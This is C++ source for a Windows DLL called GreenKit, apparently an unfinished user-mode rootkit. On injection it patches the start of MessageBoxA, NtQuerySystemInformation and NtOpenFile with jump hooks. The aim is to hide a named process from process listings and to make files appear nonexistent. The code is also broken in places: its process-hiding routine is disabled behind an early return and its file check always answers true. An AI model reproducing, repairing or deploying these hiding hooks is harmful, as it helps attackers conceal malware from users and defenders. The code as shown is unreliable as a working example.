// GreenKit.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "GreenKit.h"
#include "process.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include "ZwOpenFile.h"

typedef LONG  NTSTATUS;

typedef struct _UNICODE_STRING
{
    USHORT        Length;
    USHORT        MaximumLength;
    PWSTR        Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _ANSI_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
}ANSI_STRING, *PANSI_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG        Length;
    HANDLE        RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG        Attributes;
    PVOID        SecurityDescriptor;
    PVOID        SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;

    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef NTSTATUS(__stdcall *pNtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);

typedef NTSTATUS(__stdcall *pNtCreateKey)(
    __out PHANDLE KeyHandle,
    __in ACCESS_MASK DesiredAccess,
    __in POBJECT_ATTRIBUTES ObjectAttributes,
    __reserved ULONG TitleIndex,
    __in_opt PUNICODE_STRING Class,
    __in ULONG CreateOptions,
    __out_opt PULONG Disposition);


typedef NTSTATUS(__stdcall *_NtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
    );

typedef VOID(__stdcall *_RtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

#define FILE_CREATE 0x00000002
#define FILE_NON_DIRECTORY_FILE 0x00000040
#define OBJ_CASE_INSENSITIVE 0x00000040L

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }


BOOL mustHideFile(TCHAR filePath) {
    return TRUE; // TODO check la fin de la string avec des constantes
}

BOOL mustHideReg(TCHAR filePath) {
    return TRUE; // TODO check la fin de la string avec des constantes
}


NTSTATUS NTAPI NewNtOpenFile(
    PHANDLE				phFile,
    ACCESS_MASK			DesiredAccess,
    POBJECT_ATTRIBUTES	ObjectAttributes,
    PIO_STATUS_BLOCK	IoStatusBlock,
    ULONG				ShareAccess,
    ULONG				OpenOptions)
{
    TCHAR sPath[MAX_PATH];
    DWORD dwRet;

    dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
    pNtOpenFile NtOpenFile = (pNtOpenFile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenFile");
    if (!mustHideFile(*sPath))
        return NtOpenFile(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
    return 0xC000000F; // STATUS_NO_SUCH_FILE
}

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID;

typedef LONG KPRIORITY;

typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;



typedef struct _SYSTEM_PROCESS_INFORMATION
{
    DWORD          NextEntryDelta;
    DWORD          dThreadCount;
    DWORD          dReserved01;
    DWORD          dReserved02;
    DWORD          dReserved03;
    DWORD          dReserved04;
    DWORD          dReserved05;
    DWORD          dReserved06;
    FILETIME       ftCreateTime;	/* relative to 01-01-1601 */
    FILETIME       ftUserTime;		/* 100 nsec units */
    FILETIME       ftKernelTime;	/* 100 nsec units */
    UNICODE_STRING ProcessName;
    DWORD          BasePriority;
    DWORD          dUniqueProcessId;
    DWORD          dParentProcessID;
    DWORD          dHandleCount;
    DWORD          dReserved07;
    DWORD          dReserved08;
    DWORD          VmCounters;
    DWORD          dCommitCharge;
    SYSTEM_THREAD_INFORMATION  ThreadInfos[1];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef DWORD(CALLBACK* NQI)(DWORD, PVOID, ULONG, PULONG);
NQI NtQuerySystemInformation;
char* PNametoProtect = "GreenKitExe.exe";
BYTE hook[6];
DWORD NtQuerySystemInformationAddr = 0;

extern "C" __declspec(dllexport) void InitGreenKit()
{
    MessageBox(0, "I'm initialized!", "Message from Greenkit!", 0);
}

DWORD HookFunction(LPCSTR lpModule, LPCSTR lpFuncName, LPVOID lpFunction, unsigned char *backup)
{
    BYTE jmp[6] = { 0xe9, //jmp
        0x00, 0x00, 0x00, 0x00, //address
        0xc3 //ret
    };
    DWORD dwAddr = (DWORD)GetProcAddress(GetModuleHandle(lpModule), lpFuncName);
    ReadProcessMemory(GetCurrentProcess(), (LPVOID)dwAddr, (unsigned char *) backup, 6, 0);
    DWORD dwCalc = ((DWORD)lpFunction - dwAddr - 5);
    memcpy(&jmp[1], &dwCalc, 4);
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwAddr, jmp, 6, 0);
    return dwAddr;
}

BOOL UnHookFunction(LPCSTR lpModule, LPCSTR lpFuncName,  unsigned char *backup)
{
    DWORD dwAddr = (DWORD)GetProcAddress(GetModuleHandle(lpModule), lpFuncName);
    if (WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwAddr, (unsigned char *) backup, 6, 0))
        return TRUE;
    return FALSE;
}

int WINAPI nMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)
{
    UnHookFunction("user32.dll", "MessageBoxA", hook);
    int result = MessageBox(0, lpText, "hooked with our own function", MB_OK);
    HookFunction("user32.dll", "MessageBoxA", nMessageBox, hook);
    return result;
}

DWORD WINAPI NtQuerySystemInformationHOOK(DWORD SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    return 0;
    //unhook
    WriteProcessMemory(GetCurrentProcess(), (void*)NtQuerySystemInformationAddr, hook, 6, 0);
    PSYSTEM_PROCESS_INFORMATION pSpiCurrent, pSpiPrec;
    char *pname = NULL;
    DWORD rc = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    // Success? 
    /*if (rc == 0)
    {
        switch (SystemInformationClass)// querying for processes?
        {
        case 5:	//SystemProcessInformation
            pSpiCurrent = pSpiPrec = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

            while (1)
            {
                // allocate memory to save process name in AINSI 				 
                pname = (char *)GlobalAlloc(GMEM_ZEROINIT, pSpiCurrent->ProcessName.Length + 2);
                // Convert unicode string to ansi 
                WideCharToMultiByte(CP_ACP, 0,
                    pSpiCurrent->ProcessName.Buffer,
                    pSpiCurrent->ProcessName.Length + 1,
                    pname, pSpiCurrent->ProcessName.Length + 1,
                    NULL, NULL);
                // if process is hidden
                if (!_stricmp((char*)pname, PNametoProtect))
                {
                    if (pSpiCurrent->NextEntryDelta == 0)
                    {
                        pSpiPrec->NextEntryDelta = 0;
                        break;
                    }
                    else
                    {
                        pSpiPrec->NextEntryDelta +=
                            pSpiCurrent->NextEntryDelta; // add deltas

                        pSpiCurrent =
                            (PSYSTEM_PROCESS_INFORMATION)((PCHAR)
                            pSpiCurrent +
                            pSpiCurrent->NextEntryDelta);
                    }
                }
                else
                {
                    if (pSpiCurrent->NextEntryDelta == 0) break;
                    pSpiPrec = pSpiCurrent;
                    // Walk the list 
                    pSpiCurrent = (PSYSTEM_PROCESS_INFORMATION)
                        ((PCHAR)pSpiCurrent +
                        pSpiCurrent->NextEntryDelta);
                }

                GlobalFree(pname);
            }
            break;
        }
    }
    NtQuerySystemInformationAddr = UnHookFunction("ntdll.dll", "NtQuerySystemInformation", hook);*/
    return (rc);
}

INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved)
{
    DWORD procID = GetCurrentProcessId();
    
    char buffer[64];
    wsprintf(buffer, "Injected on process %d", procID);
    int messageBoxTest = 1;
    if (messageBoxTest == 1)
    {
        HookFunction("user32.dll", "MessageBoxA", nMessageBox, hook);
        //HookFunction("ntdll.dll", "NtQuerySystemInformation", NtQuerySystemInformationHOOK, hook);
        MessageBox(0, buffer, "This text will NEVER APPEAR", 0);
        //InitGreenKit();
        UnHookFunction("user32.dll", "MessageBoxA", hook);
        MessageBox(0, buffer, "I AM A FREE FUNCTIONNN", 0);
    }
    else if (messageBoxTest == 2)
    {
        HookFunction("ntdll.dll", "NtQuerySystemInformation", NtQuerySystemInformationHOOK, hook);
    }
    else if (messageBoxTest == 3)
    {
        HookFunction("ntdll.dll", "NtOpenFile", NewNtOpenFile, hook);
    }
    return TRUE;
}